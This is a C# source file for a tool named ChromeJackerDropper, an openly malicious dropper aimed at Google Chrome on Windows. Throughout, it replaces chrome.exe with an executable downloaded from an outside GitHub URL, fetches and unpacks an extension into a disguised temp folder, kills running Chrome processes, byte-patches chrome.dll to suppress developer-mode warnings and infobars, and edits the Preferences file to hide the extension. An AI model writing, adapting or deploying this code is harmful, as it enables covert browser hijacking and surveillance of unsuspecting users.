using System;
using System.Net;
using System.IO.Compression;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.IO;
namespace ChromeJackerDropper
{
    class Program
    {
        static void Main(string[] args)
        {

            //Patch Chrome.exe w/ malicious argument --load-extension
            Console.WriteLine("[*] Patching Chrome.exe");
            System.IO.File.Move("C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome-backup.exe");
            WebClient WebClnt = new WebClient();
            WebClnt.DownloadFile("https://github.com/RT-KT/ChromeJacker/raw/master/ChromeJackerx86.exe", "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe");
            //Download an unzip extension to target path
            Console.WriteLine("[*] Downloading & Unzipping Extension");
            WebClnt.DownloadFile("https://github.com/RT-KT/ChromeJacker/raw/master/ExampleExtension/ExampleExtension.zip?q=1", "C:\\Windows\\Temp\\xbdcf.zip");
            ZipFile.ExtractToDirectory("C:\\Windows\\Temp\\xbdcf.zip", "C:\\Windows\\Temp\\ChromeInternals\\SecurityHealthSvc");
            Console.WriteLine("[*] Deleting Zip File");
            System.IO.File.Delete("C:\\Windows\\Temp\\xbdcf.zip");
            //kill chrome.exe
            Console.WriteLine("[*] Killing Chrome.exe Instances");
            foreach (var process in Process.GetProcessesByName("chrome"))
            {
                process.Kill();
            }
            Console.WriteLine("[*] Patching Chrome.dll for Debug & Developer Warnings...");
            //Get rid of dev mode extension warning
            Patcher.MainMethod();

            //Patch Preferences file to hide toolbar
            Console.WriteLine("[*] Modifyng Chrome Preferences File to hide extensions.");
            String PrefFile = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Preferences");
            String PatchedData = Regex.Replace(PrefFile, "\"toolbarsize\":(.+),\"ui\"", "\"toolbarsize\": 0,\"ui\"");
            System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Preferences", PatchedData);
            Console.WriteLine("[*] Done.");
            Console.ReadLine();
        }
        public class Patcher
        {
            private static string CHROME_INSTALLATION_FOLDER = @"C:\Program Files (x86)\Google\Chrome\Application";

            private static readonly byte[] SHOULDINCLUDEEXTENSION_FUNCTION_PATTERN = { 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xD1, 0xE8, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0xC1 }; // 0xFF is ?
            private static readonly byte[] MAYBEADDINFOBAR_FUNCTION_PATTERN = { 0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x53, 0x48, 0x81, 0xEC, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x31, 0xE0, 0x48, 0x89, 0x84, 0x24, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x4A, 0x08 }; // 0xFF is ?; debugPatch
            private static readonly byte[] SHOULDPREVENTELISION_FUNCTION_PATTERN = { 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0xFF, 0xE8, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x61 }; // 0xFF is ?

            private static BytePatch[] BYTE_PATCHES = { new BytePatch(SHOULDINCLUDEEXTENSION_FUNCTION_PATTERN, 0x04, 0xFF, 22), new BytePatch(SHOULDINCLUDEEXTENSION_FUNCTION_PATTERN, 0x08, 0xFF, 35), new BytePatch(SHOULDPREVENTELISION_FUNCTION_PATTERN, 0x56, 0xC3, 0x0), new BytePatch(MAYBEADDINFOBAR_FUNCTION_PATTERN, 0x41, 0xC3, 0x0) };

            private static readonly BytePatch REMOVAL_PATCH = new BytePatch(new byte[] { }, 0x0, 0x0, int.MinValue);

            private static double GetUnixTime(DateTime date)
            {
                return (DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
            }

            public static void MainMethod()
            {
                RemovePatches(SHOULDPREVENTELISION_FUNCTION_PATTERN);

                DirectoryInfo chromeFolder = new DirectoryInfo(CHROME_INSTALLATION_FOLDER);

                List<DirectoryInfo> chromeVersions = new List<DirectoryInfo>(chromeFolder.EnumerateDirectories());
                chromeVersions = chromeVersions.OrderByDescending(dirInfo => GetUnixTime(dirInfo.LastWriteTime)).ToList();
                foreach (DirectoryInfo dirs in chromeVersions)
                {
                    if (dirs.Name.Contains("."))
                    {
                        Console.WriteLine("Found chrome installation: " + dirs.Name);

                        foreach (FileInfo file in dirs.EnumerateFiles())
                        {
                            if (file.Name.Equals("chrome.dll"))
                            {
                                Console.WriteLine("Found chrome.dll: " + file.FullName);
                                Console.WriteLine("Patching successful?: " + BytePatchChrome(file));
                                break;
                            }
                        }

                        break;
                    }
                }
                Thread.Sleep(1000); // Wait a bit to let the user see the result
            }
            private static bool BytePatchChrome(FileInfo chromeDll)
            {
                byte[] chromeBytes = File.ReadAllBytes(chromeDll.FullName);
                int patches = 0;
                int removalHashCode = REMOVAL_PATCH.GetHashCode();

                foreach (BytePatch bytePatch in BYTE_PATCHES)
                {
                    if (bytePatch.GetHashCode() == removalHashCode)
                    {
                        Console.WriteLine("Ignoring a pattern with hashcode " + removalHashCode);
                        patches++;
                        continue;
                    }

                    int patternIndex = 0, patternOffset = 0;
                    bool foundPattern = false;

                    for (int i = 0; i < chromeBytes.Length; i++)
                    {
                        byte chromeByte = chromeBytes[i];
                        byte expectedByte = bytePatch.pattern[patternIndex];

                        if (expectedByte == 0xFF ? true : (chromeByte == expectedByte))
                            patternIndex++;
                        else
                            patternIndex = 0;

                        if (patternIndex == bytePatch.pattern.Length)
                        {
                            foundPattern = true;
                            patternOffset = i - (patternIndex - 1);
                            Console.WriteLine("Found pattern offset at " + patternOffset);
                            break;
                        }
                    }

                    if (!foundPattern)
                    {
                        Console.WriteLine("Pattern not found!");
                        return false;
                    }
                    else
                    {
                        int index = patternOffset + bytePatch.offset;
                        byte sourceByte = chromeBytes[index];

                        Console.WriteLine("Source byte of patch at " + bytePatch.offset + ": " + sourceByte);
                        if (sourceByte == bytePatch.origByte)
                        {
                            chromeBytes[index] = bytePatch.patchByte;
                            Console.WriteLine(index + " => " + bytePatch.patchByte);
                            patches++;
                        }
                        else
                            Console.WriteLine("Source byte unexpected, should be " + bytePatch.origByte + "!");
                    }
                }

                if (patches == BYTE_PATCHES.Length)
                {
                    File.WriteAllBytes(chromeDll.FullName, chromeBytes);
                    Console.WriteLine("Patched " + patches + " bytes in " + chromeDll.FullName);
                    return true;
                }
                return false;
            }

            private static bool ContainsArg(string[] args, string arg)
            {
                foreach (string argi in args)
                {
                    if (argi.ToLower().Replace("-", "").Equals(arg.ToLower()))
                        return true;
                }
                return false;
            }

            private static void RemovePatches(byte[] pattern)
            {
                int hashCode = pattern.GetHashCode();

                int i = 0;
                foreach (BytePatch bp in BYTE_PATCHES)
                {
                    if (bp.pattern.GetHashCode() == hashCode)
                    {
                        BYTE_PATCHES[i] = REMOVAL_PATCH;
                    }
                    i++;
                }
            }

            private const string PATH_REGEX = @"\\([a-zA-Z]{4,})";
            private static void SetNewFolder(string[] args)
            {
                StringBuilder sb = new StringBuilder();

                for (int i = 0; i < args.Length; i++)
                {
                    sb.Append(args[i] + " ");
                }
                if (sb.Length > 0)
                    sb.Remove(sb.Length - 1, 1);
                string fullArgs = sb.ToString().ToLower();

                string arg = "-custompath ";
                int pathIndex = fullArgs.IndexOf(arg);
                if (pathIndex != -1)
                {
                    pathIndex += arg.Length;
                    fullArgs = fullArgs.Substring(pathIndex).Replace("\"", "");

                    var regMatches = Regex.Matches(fullArgs, PATH_REGEX);
                    if (regMatches.Count == 0)
                    {
                        Console.WriteLine("Invalid path given");
                        Environment.Exit(1);
                        return;
                    }
                    Match regMatch = regMatches[regMatches.Count - 1];
                    string regMatchGroup = regMatch.Groups[0].Value;

                    CHROME_INSTALLATION_FOLDER = fullArgs.Substring(0, regMatch.Index + regMatchGroup.Length);
                    Console.WriteLine("New installation folder set: " + CHROME_INSTALLATION_FOLDER);
                }
            }
        }
    }
}
